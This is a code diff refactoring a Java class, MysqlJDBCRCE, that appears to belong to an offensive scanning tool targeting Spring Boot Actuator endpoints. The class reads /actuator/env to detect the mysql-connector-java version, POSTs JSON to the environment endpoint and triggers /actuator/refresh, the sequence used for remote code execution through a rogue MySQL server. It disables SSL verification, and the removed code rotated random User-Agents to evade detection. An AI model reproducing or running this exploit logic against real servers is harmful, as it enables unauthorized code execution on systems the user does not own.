@@ -1,20 +1,14 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
-import src.main.impl.ResultCallback;
+import src.main.common.HTTPConfig;
 
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.Base64;
-import java.util.List;
-import java.util.Objects;
-import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class MysqlJDBCRCE {
     private String address;
@@ -43,17 +37,11 @@ public class MysqlJDBCRCE {
         String refapi = "/actuator/refresh";
         String llib1 = "mysql-connector-java";
         String site = address + api;
-        String refite = address + refapi;
-        String ua = "";
+        String refsite = address + refapi;
         String data = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -100,10 +88,7 @@ public class MysqlJDBCRCE {
                         text = "未知mysql版本";
                     }
                     try {
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent", ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type", "application/json");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -114,10 +99,7 @@ public class MysqlJDBCRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK) {
                             try {
-                                URL obj2 = new URL(refite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                                ua = uacf.getRandomUserAgent(ualist);
-                                conn2.setRequestProperty("User-Agent", ua);
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(refsite);
                                 conn2.setRequestProperty("Content-Type", "application/json");
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
@@ -164,15 +146,9 @@ public class MysqlJDBCRCE {
     public void Exp(){
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
@@ -200,8 +176,8 @@ public class MysqlJDBCRCE {
         }
     }
 
-    public static void main(String[] args) {
-        MysqlJDBCRCE m = new MysqlJDBCRCE("http://127.0.0.1:9097/","127.0.0.1","3307");
-        m.Exp();
-    }
+//    public static void main(String[] args) {
+//        MysqlJDBCRCE m = new MysqlJDBCRCE("http://127.0.0.1:9097/","127.0.0.1","3307");
+//        m.Exp();
+//    }
 }
